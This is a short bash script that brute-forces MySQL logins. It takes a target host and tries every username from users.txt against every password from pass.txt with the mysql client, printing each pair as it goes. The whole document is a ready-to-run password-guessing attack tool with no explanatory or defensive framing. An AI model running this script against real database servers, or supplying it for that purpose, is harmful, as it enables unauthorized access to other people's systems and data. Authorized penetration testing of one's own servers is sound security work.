#!/bin/bash

if [ "$1" == "" ]
        then
                echo;echo "[>] Usage: $0 <target>";echo
        else
                for u in $(cat users.txt);do
                        for p in $(cat pass.txt);do
                                echo $u:$p
                                mysql -h $1 --user=$u --password=$p
                        done
                done
fi
